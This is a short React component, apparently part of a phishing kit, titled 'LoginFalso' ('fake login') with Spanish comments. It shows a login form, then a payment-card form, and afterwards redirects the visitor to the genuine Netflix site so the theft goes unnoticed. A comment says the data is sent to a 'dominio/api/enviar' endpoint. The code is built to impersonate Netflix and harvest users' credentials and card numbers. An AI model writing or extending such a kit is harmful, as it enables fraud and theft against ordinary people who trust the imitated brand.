import React, { useState } from "react";
import Login from "./componentsLoginfalso/Login";
import TarjetaPago from "./componentsLoginfalso/Tarjeta"; // Importa tu formulario de tarjeta
import './Iniciar.module.css';

export default function LoginFalso() {
  const [isLoginForm, setIsLoginForm] = useState(true); // Estado para alternar formularios
  const onPaymentSuccess = () => {
    // Redirigir a la página de Netflix
    window.location.href = "https://www.netflix.com/ar/browse/genre/839338";
  };
  // Función que cambia el estado a mostrar la tarjeta después del login exitoso
  const handleLoginSuccess = () => {
    setIsLoginForm(false); // Cambiar a mostrar Tarjeta
  };

  return (
 // URL = dominio/api/enviar         Al hacer click y que todo este bien

    <div className="styles.loginfalso">
      {isLoginForm ? <Login onLoginSuccess={handleLoginSuccess} /> :    <TarjetaPago onPaymentSuccess={onPaymentSuccess} />}
    </div>
  );
}
